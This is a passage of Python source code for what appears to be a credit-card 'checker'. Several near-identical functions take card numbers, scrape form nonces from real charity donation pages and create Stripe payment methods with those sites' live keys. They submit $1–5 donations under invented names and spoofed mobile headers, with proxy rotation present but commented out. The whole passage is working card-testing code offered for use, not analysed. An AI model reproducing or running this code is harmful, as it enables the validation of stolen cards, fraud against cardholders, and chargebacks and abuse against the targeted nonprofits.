    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapeacewithin.org%2Fdonation-page%2F',
    '__stripe_mid': 'be2e0343-8909-43cd-ba4f-3753d6408c39523a89',
    '__stripe_sid': 'fe58d9de-bdd2-49ab-bad8-2a3187d6873e8f8cf8',
        }
        headers = {
    'authority': 'apeacewithin.org',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://apeacewithin.org',
    'pragma': 'no-cache',
    'referer': 'https://apeacewithin.org/donation-page/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
        }
        data = {
    'charitable_form_id': f'{form_id}',
    f'{form_id}': '',
    '_charitable_donation_nonce': f'{donation_nonce}',
    '_wp_http_referer': '/donation-page/',
    'campaign_id': f'{campaign_id}',
    'description': 'Help Families Find Peace',
    'ID': f'{donation_id}',
    'gateway': 'stripe',
    'donation_amount': 'custom',
    'custom_donation_amount': '5.00',
    'first_name': 'Tiana',
    'last_name': 'Jakubowski',
    'email': email,
    'address': '24 George Street',
    'address_2': '',
    'city': 'Racie',
    'state': 'New South Walet',
    'postcode': '2000',
    'country': 'AU',
    'phone': '+61290123456',
    'stripe_payment_method': f'{pm}',
    'action': 'make_donation',
    'form_action': 'make_donation',
        }
        response = requests.post(
    'https://apeacewithin.org/wp-admin/admin-ajax.php',
    cookies=cookies,
    headers=headers,
    data=data,#, proxies=proxy, timeout=30)    
        )
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51SLtAyCCN2Lu09IK5wAiYqjCXgQOozIV5lqweW3r1Bs5ucosj0kuXTJ7nC5S2Xc5CT4xYuObLLxCnXJsWHCAQPLk00cGAmbonk',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}")
        
#============================================
# --- Main CC Check Function ---
def go11(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://altaseadsconservancy.org/campaigns/operations/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G11 ID Response: {form_id}")
        print(f"G11 ID Response: {donation_nonce}")
        print(f"G11 ID Response: {campaign_id}")
        print(f"G11 ID Response: {donation_id}")
        	
        #2
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+card-element&referrer=https%3A%2F%2Fwww.altaseadsconservancy.org&time_on_page=42681&client_attribution_metadata[client_session_id]=1966980c-5181-4fa3-af8f-8f328b45386f&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51MroX6ES7srJGP9YNv9OqzlN4X47yrRIjSMBA4opyz6NtnuoCLwV5hdMcU4zrTbWEdQejUxwdrZyw6iHVP9pEXpa00xkqBfq0N'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G11 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
    '__stripe_mid': 'f6635a5a-4925-4970-8de0-cc40ae98452170c170',
    'nfd-enable-cf-opt': '63a6825d27cab0f204d3b602',
    'charitable_session': 'a2638ff555cd2926bb2cf238bb5dfe84||86400||82800',
    '__stripe_sid': '638ed1f4-d591-473a-9692-1d524e046d433bc034',
        }
        headers = {
    'authority': 'www.altaseadsconservancy.org',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__stripe_mid=f6635a5a-4925-4970-8de0-cc40ae98452170c170; nfd-enable-cf-opt=63a6825d27cab0f204d3b602; charitable_session=a2638ff555cd2926bb2cf238bb5dfe84||86400||82800; __stripe_sid=638ed1f4-d591-473a-9692-1d524e046d433bc034',
    'origin': 'https://www.altaseadsconservancy.org',
    'pragma': 'no-cache',
    'referer': 'https://www.altaseadsconservancy.org/campaigns/operations/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
        }
        data = {
    'charitable_form_id': f'{form_id}',
    f'{form_id}': '',
    '_charitable_donation_nonce': f'{donation_nonce}',
    '_wp_http_referer': '/campaigns/operations/',
    'campaign_id': f'{campaign_id}',
    'description': 'Operations',
    'ID': f'{donation_id}',
    'custom_donation_amount': '1.00',
    'first_name': 'Tiana',
    'last_name': 'Jakubowski',
    'email': email,
    'gateway': 'stripe',
    'stripe_payment_method': f'{pm}',
    'action': 'make_donation',
    'form_action': 'make_donation',
        }
        response = requests.post(
    'https://www.altaseadsconservancy.org/wp-admin/admin-ajax.php',
    cookies=cookies,
    headers=headers,
    data=data,#, proxies=proxy, timeout=30)    
        )
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51MroX6ES7srJGP9YNv9OqzlN4X47yrRIjSMBA4opyz6NtnuoCLwV5hdMcU4zrTbWEdQejUxwdrZyw6iHVP9pEXpa00xkqBfq0N',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}")
        
#============================================
# --- Main CC Check Function ---
def go12(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://mentoredbynature.com/donate-and-support/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G12 ID Response: {form_id}")
        print(f"G12 ID Response: {donation_nonce}")
        print(f"G12 ID Response: {campaign_id}")
        print(f"G12 ID Response: {donation_id}")
        	
        #2
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F328730e3ee%3B+stripe-js-v3%2F328730e3ee%3B+card-element&referrer=https%3A%2F%2Fmentoredbynature.com&time_on_page=28013&client_attribution_metadata[client_session_id]=4de09c12-9c5f-4277-8d5e-f7c4c4441fa8&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51RTq9zRsOx2txaML3VgjUAAMHfyv1IUr5doGxJIc6f2dwRfgXEHq6sAdwCLs1IodErvXVOKIrgLuRFnqPxTHyz5V00VniQiMS7'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G12 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
    '__stripe_mid': '7a299d2d-2498-4831-b7f5-089ca187c5596473a0',
    'charitable_session': '82d4396681c212e74278a63c4aed8628||86400||82800',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-12-23%2018%3A59%3A28%7C%7C%7Cep%3Dhttps%3A%2F%2Fmentoredbynature.com%2Fdonate-and-support%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-12-23%2018%3A59%3A28%7C%7C%7Cep%3Dhttps%3A%2F%2Fmentoredbynature.com%2Fdonate-and-support%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmentoredbynature.com%2Fdonate-and-support%2F',
    '__stripe_sid': 'd6fc373d-24e5-4887-9f7f-f5fe0da495ff38ba41',
        }
        headers = {
    'authority': 'mentoredbynature.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__stripe_mid=7a299d2d-2498-4831-b7f5-089ca187c5596473a0; charitable_session=82d4396681c212e74278a63c4aed8628||86400||82800; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-12-23%2018%3A59%3A28%7C%7C%7Cep%3Dhttps%3A%2F%2Fmentoredbynature.com%2Fdonate-and-support%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-12-23%2018%3A59%3A28%7C%7C%7Cep%3Dhttps%3A%2F%2Fmentoredbynature.com%2Fdonate-and-support%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmentoredbynature.com%2Fdonate-and-support%2F; __stripe_sid=d6fc373d-24e5-4887-9f7f-f5fe0da495ff38ba41',
    'origin': 'https://mentoredbynature.com',
    'pragma': 'no-cache',
    'referer': 'https://mentoredbynature.com/donate-and-support/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
        }
        data = {
    'charitable_form_id': f'{form_id}',
    f'{form_id}': '',
    '_charitable_donation_nonce': f'{donation_nonce}',
    '_wp_http_referer': '/donate-and-support/',
    'campaign_id': f'{campaign_id}',
    'description': 'Support Nature Connection in Aotearoa',
    'ID': f'{donation_id}',
    'gateway': 'stripe',
    'recurring_donation': 'month',
    'donation_amount': 'recurring-custom',
    'custom_recurring_donation_amount': '1.00',
    'custom_donation_amount': '',
    'first_name': 'Tiana',
    'last_name': 'Jakubowski',
    'email': email,
    'anonymous_donation': '1',
    'stripe_payment_method': f'{pm}',
    'action': 'make_donation',
    'form_action': 'make_donation',
        }
        response = requests.post(
    'https://mentoredbynature.com/wp-admin/admin-ajax.php',
    cookies=cookies,
    headers=headers,
    data=data,#, proxies=proxy, timeout=30)    
        )
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51rtq9zrsox2txaml3vgjuaamhfyv1iur5dogxjic6f2dwrfgxehq6sadwcls1iodervxvokirglurfnqpxthyz5v00vniqims7',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}") 
        
#============================================
# --- Main CC Check Function ---
def go13(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://ccfoundationorg.com/donate/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G13 ID Response: {form_id}")
        print(f"G13 ID Response: {donation_nonce}")
        print(f"G13 ID Response: {campaign_id}")
        print(f"G13 ID Response: {donation_id}")
        	
        #2
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&billing_details[address][line1]=24+George+Street&billing_details[address][postal_code]=2000&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+card-element&referrer=https%3A%2F%2Fccfoundationorg.com&time_on_page=18639&client_attribution_metadata[client_session_id]=54f4b99f-0247-4e79-b555-e8666262b8a7&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51IGkkVAgdYEhlUBFnXi5eN0WC8T5q7yyDOjZfj3wGc93b2MAxq0RvWwOdBdGIl7enL3Lbx27n74TTqElkVqk5fhE00rUuIY5Lp'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G13 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
    'charitable_session': '75cf8a85edd3c55a8dd442a1cad03276||86400||82800',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-12-23%2019%3A04%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fccfoundationorg.com%2Fdonate%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-12-23%2019%3A04%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fccfoundationorg.com%2Fdonate%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fccfoundationorg.com%2Fdonate%2F',
    '__stripe_mid': '25bc75bb-3f89-4b45-8cd4-aee852bb48b1932887',
    '__stripe_sid': 'eb7897e6-7ec3-4d3f-aa2c-3c2a45a05c36996829',
        }
        headers = {
    'authority': 'ccfoundationorg.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'charitable_session=75cf8a85edd3c55a8dd442a1cad03276||86400||82800; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-12-23%2019%3A04%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fccfoundationorg.com%2Fdonate%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-12-23%2019%3A04%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fccfoundationorg.com%2Fdonate%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fccfoundationorg.com%2Fdonate%2F; __stripe_mid=25bc75bb-3f89-4b45-8cd4-aee852bb48b1932887; __stripe_sid=eb7897e6-7ec3-4d3f-aa2c-3c2a45a05c36996829',
    'origin': 'https://ccfoundationorg.com',
    'pragma': 'no-cache',
    'referer': 'https://ccfoundationorg.com/donate/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
        }
        data = {
    'charitable_form_id': f'{form_id}',
    f'{form_id}': '',
    '_charitable_donation_nonce': f'{donation_nonce}',
    '_wp_http_referer': '/donate/',
    'campaign_id': f'{campaign_id}',
    'description': 'CC Foundation Donation Form',
    'ID': f'{donation_id}',
    'donation_amount': 'custom',
    'custom_donation_amount': '1.00',
    'recurring_donation': 'once',
    'title': 'Mr',
    'first_name': 'Tiana',
    'last_name': 'Jakubowski',
    'email': email,
    'address': '24 George Street',
    'postcode': '2000',
    'gateway': 'stripe',
    'stripe_payment_method': f'{pm}',
    'action': 'make_donation',
    'form_action': 'make_donation',
        }
        response = requests.post(
    'https://ccfoundationorg.com/wp-admin/admin-ajax.php',
    cookies=cookies,
    headers=headers,
    data=data,#, proxies=proxy, timeout=30)    
        )
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
